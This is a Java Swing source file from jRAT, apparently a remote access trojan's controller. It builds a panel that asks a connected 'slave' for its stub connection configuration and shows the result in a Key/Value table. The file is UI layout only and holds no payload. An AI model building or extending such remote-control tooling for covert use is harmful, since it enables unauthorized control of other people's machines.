package se.jrat.client.ui.panels;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.BorderFactory;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.table.DefaultTableModel;

import se.jrat.client.Slave;
import se.jrat.client.packets.outgoing.Packet88StubConfig;
import se.jrat.client.ui.components.DefaultJTable;
import se.jrat.client.utils.IconUtils;


@SuppressWarnings("serial")
public class PanelControlConfig extends PanelControlParent {

	private JTable table;

	public DefaultTableModel getModel() {
		return (DefaultTableModel) table.getModel();
	}

	public PanelControlConfig(Slave sl) {
		super(sl);

		JPanel panel = new JPanel();
		panel.setBorder(BorderFactory.createTitledBorder("Connection Configuration"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(panel, GroupLayout.PREFERRED_SIZE, 577, GroupLayout.PREFERRED_SIZE).addContainerGap(13, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(panel, GroupLayout.PREFERRED_SIZE, 324, GroupLayout.PREFERRED_SIZE).addContainerGap(15, Short.MAX_VALUE)));

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReload = new JButton("Reload");
		btnReload.setIcon(IconUtils.getIcon("update"));
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
				slave.addToSendQueue(new Packet88StubConfig());
			}
		});

		JButton btnClear = new JButton("Clear");
		btnClear.setIcon(IconUtils.getIcon("clear"));
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
			}
		});
		GroupLayout gl_panel = new GroupLayout(panel);
		gl_panel.setHorizontalGroup(gl_panel.createParallelGroup(Alignment.TRAILING).addGroup(gl_panel.createSequentialGroup().addContainerGap().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 545, GroupLayout.PREFERRED_SIZE).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)).addGroup(gl_panel.createSequentialGroup().addContainerGap(387, Short.MAX_VALUE).addComponent(btnClear).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnReload).addContainerGap()));
		gl_panel.setVerticalGroup(gl_panel.createParallelGroup(Alignment.LEADING).addGroup(gl_panel.createSequentialGroup().addContainerGap().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 241, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, 13, Short.MAX_VALUE).addGroup(gl_panel.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnClear)).addContainerGap()));

		table = new DefaultJTable();
		table.setModel(new DefaultTableModel(new Object[][] {}, new String[] { "Key", "Value" }));
		table.setRowHeight(25);
		table.getColumnModel().getColumn(0).setPreferredWidth(199);
		table.getColumnModel().getColumn(1).setPreferredWidth(335);
		scrollPane.setViewportView(table);
		panel.setLayout(gl_panel);
		setLayout(groupLayout);
	}

	public void clear() {
		while (getModel().getRowCount() > 0) {
			getModel().removeRow(0);
		}
	}
}
